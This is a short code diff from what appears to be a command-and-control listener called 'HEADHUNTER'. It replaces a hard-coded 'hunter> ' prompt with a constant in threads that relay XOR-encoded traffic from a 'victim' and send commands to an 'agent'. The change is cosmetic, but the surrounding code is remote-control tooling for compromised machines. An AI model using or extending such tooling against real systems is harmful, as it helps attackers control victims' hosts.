@@ -155,7 +155,7 @@ void *Socket_Reader(){
     char* response = "--HEADHUNTER NO--";
     char* xorresponse = XOR(response, key, strlen(response), keylen);
 
-    printf("hunter> ");
+    printf(hunterPROMPT);
 
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
@@ -190,7 +190,7 @@ void *Socket_Reader(){
 	printf("\e[1;32m[+]\e[0m Received %li bytes\n", strlen(xorbuffer));
 
 	if(a.kill == 0){
-		printf("hunter> ");
+		printf(hunterPROMPT);
 	}
 
         if (write(STDOUT_FILENO, xorbuffer, n) < 0)  // writes data from victim fd to stdout
@@ -240,7 +240,7 @@ void *Socket_Writer()
             return NULL;
         } 
 	else if(strcmp(newline_terminator(buffer), "\n") == 0){
-		printf("hunter> ");
+		printf(hunterPROMPT);
 		fflush(NULL);
 	}
 	else if(strcmp(newline_terminator(buffer), "help\n") == 0){
@@ -253,7 +253,7 @@ void *Socket_Writer()
 		printf("bg                         backgrounds the agent command session\n");
 		printf("exit                       tasks the agent to exit\n\n");
 
-		printf("hunter> ");
+		printf(hunterPROMPT);
 		fflush(NULL);
 	}
 	else if(strcmp(newline_terminator(buffer), "exit\n") == 0){
@@ -293,7 +293,7 @@ void *Socket_Writer()
             }
 	    else{
 		printf("Invalid command, type \"help\" to list commands\n");
-		printf("hunter> ");
+		printf(hunterPROMPT);
 		fflush(NULL);
 	    }
 	    //free(xorbuffer);
